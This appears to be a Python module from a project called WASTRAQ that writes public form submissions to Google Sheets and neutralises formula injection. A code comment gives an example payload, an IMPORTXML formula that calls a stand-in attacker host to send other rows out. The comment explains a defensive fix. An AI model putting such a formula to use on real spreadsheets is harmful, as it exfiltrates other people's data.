"""
WASTRAQ – utils/sheets.py  (FIXED)
────────────────────────────────────
Fixes applied:
  1. Service account file is now resolved relative to THIS FILE's directory,
     not Python's current working directory.  Previously if you ran uvicorn
     from /home/user/ the file was looked for at /home/user/service_account.json
     instead of /home/user/backend/service_account.json.
  2. Added explicit try/except for every Google API call with full traceback logging.
  3. Added googleapiclient.discovery import error message.
  4. _get_service() now re-raises with a human-readable message.
  5. Added _sheet_exists() helper to avoid creating duplicate sheets.
  6. All values are explicitly cast to str before sending to avoid type errors.
  7. Added a 'Date' column injection (caller can choose to pass it themselves).
"""

import os
import json
import logging
from pathlib import Path
from typing import List

log = logging.getLogger(__name__)

# ── Lazy import so the app starts even if google libs are missing ─────────────
try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    from googleapiclient.errors import HttpError
    _GOOGLE_AVAILABLE = True
except ImportError:
    _GOOGLE_AVAILABLE = False
    log.error(
        "google-auth / google-api-python-client not installed. "
        "Run:  pip install google-auth google-api-python-client google-auth-httplib2"
    )

SCOPES = ["https://www.googleapis.com/auth/spreadsheets"]


def _resolve_key_path() -> Path:
    """
    Resolve the service account file path.
    Tries:
      1. Absolute path from env var
      2. Relative path from the backend/ directory (same folder as sheets.py)
      3. Relative path from CWD
    """
    key_file = os.getenv("GOOGLE_SERVICE_ACCOUNT_FILE", "service_account.json").strip()
    p = Path(key_file)

    if p.is_absolute() and p.exists():
        return p

    # Relative to this file's parent directory (backend/)
    local = Path(__file__).resolve().parent.parent / key_file
    if local.exists():
        return local

    # Relative to CWD
    cwd = Path.cwd() / key_file
    if cwd.exists():
        return cwd

    raise FileNotFoundError(
        f"service_account.json not found.\n"
        f"  Tried: {p.resolve()}\n"
        f"         {local}\n"
        f"         {cwd}\n"
        f"  → Place the file at: {local}\n"
        f"  → Or set GOOGLE_SERVICE_ACCOUNT_FILE to the full absolute path."
    )


def _get_service():
    if not _GOOGLE_AVAILABLE:
        raise RuntimeError(
            "Google client libraries not installed. "
            "Run: pip install google-auth google-api-python-client google-auth-httplib2"
        )

    key_path = _resolve_key_path()
    log.info("Using service account key: %s", key_path)

    try:
        creds = service_account.Credentials.from_service_account_file(
            str(key_path), scopes=SCOPES
        )
    except (json.JSONDecodeError, ValueError) as exc:
        raise ValueError(
            f"service_account.json is invalid or corrupt: {exc}\n"
            f"  → Download a fresh key from Google Cloud Console."
        ) from exc

    return build("sheets", "v4", credentials=creds, cache_discovery=False)


def _sheet_exists(service, spreadsheet_id: str, sheet_name: str) -> bool:
    meta     = service.spreadsheets().get(spreadsheetId=spreadsheet_id).execute()
    existing = {s["properties"]["title"] for s in meta.get("sheets", [])}
    return sheet_name in existing


def _ensure_sheet_exists(service, spreadsheet_id: str, sheet_name: str):
    if not _sheet_exists(service, spreadsheet_id, sheet_name):
        service.spreadsheets().batchUpdate(
            spreadsheetId=spreadsheet_id,
            body={"requests": [{"addSheet": {"properties": {"title": sheet_name}}}]},
        ).execute()
        log.info("Sheet '%s' created.", sheet_name)


def _ensure_headers(service, spreadsheet_id: str, sheet_name: str, headers: List[str]):
    result = (
        service.spreadsheets()
        .values()
        .get(spreadsheetId=spreadsheet_id, range=f"'{sheet_name}'!A1:ZZ1")
        .execute()
    )
    existing = result.get("values", [])
    if not existing:
        service.spreadsheets().values().update(
            spreadsheetId=spreadsheet_id,
            range=f"'{sheet_name}'!A1",
            valueInputOption="RAW",
            body={"values": [headers]},
        ).execute()
        log.info("Headers written to sheet '%s': %s", sheet_name, headers)



# Characters that Google Sheets (and Excel/LibreOffice on export) treat as
# the start of a formula when a cell is written with valueInputOption=
# USER_ENTERED. Every value that reaches append_row() below originates from
# a public, unauthenticated form submission, so without this a visitor
# could submit e.g. =IMPORTXML("https://evil.example/"&A1,"//x") as their
# name or message and have it execute as a live formula the moment someone
# opens the spreadsheet — a classic CSV/Formula Injection (CWE-1236) that
# can exfiltrate other rows to an attacker-controlled server.
_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def _sanitize_cell(value: str) -> str:
    """Neutralise formula injection by forcing a leading trigger character
    to be treated as literal text, exactly like Google Sheets/Excel do when
    a cell value is prefixed with a single quote."""
    if value and value[0] in _FORMULA_TRIGGER_CHARS:
        return "'" + value
    return value


def append_row(sheet_name: str, headers: List[str], row: List):
    """
    Append a data row to the specified Google Sheet.
    Auto-creates the sheet and writes headers if they are missing.
    """
    spreadsheet_id = os.getenv("SPREADSHEET_ID", "").strip()
    if not spreadsheet_id:
        log.error(
            "SPREADSHEET_ID is empty in .env — Google Sheets write skipped.\n"
            "  → Open backend/.env and set:  SPREADSHEET_ID=your-spreadsheet-id"
        )
        raise ValueError("SPREADSHEET_ID not configured.")

    # Cast everything to string, strip, then neutralise any leading
    # formula-trigger character before it ever reaches the Sheets API.
    str_row = [_sanitize_cell(str(v).strip()) if v is not None else "" for v in row]

    log.info("Appending to sheet '%s': %s", sheet_name, str_row)

    try:
        service = _get_service()

        _ensure_sheet_exists(service, spreadsheet_id, sheet_name)
        _ensure_headers(service, spreadsheet_id, sheet_name, headers)

        result = service.spreadsheets().values().append(
            spreadsheetId    = spreadsheet_id,
            range            = f"'{sheet_name}'!A1",
            valueInputOption = "USER_ENTERED",
            insertDataOption = "INSERT_ROWS",
            body             = {"values": [str_row]},
        ).execute()

        updated = result.get("updates", {}).get("updatedRows", 0)
        log.info("Row appended to '%s' — %d row(s) updated.", sheet_name, updated)

    except FileNotFoundError as exc:
        log.error("Sheets write failed — key file missing:\n%s", exc)
        raise
    except ValueError as exc:
        log.error("Sheets write failed — config error:\n%s", exc)
        raise
    except Exception as exc:            # catches HttpError and anything else
        log.error("Sheets write failed for '%s': %s", sheet_name, exc, exc_info=True)
        raise
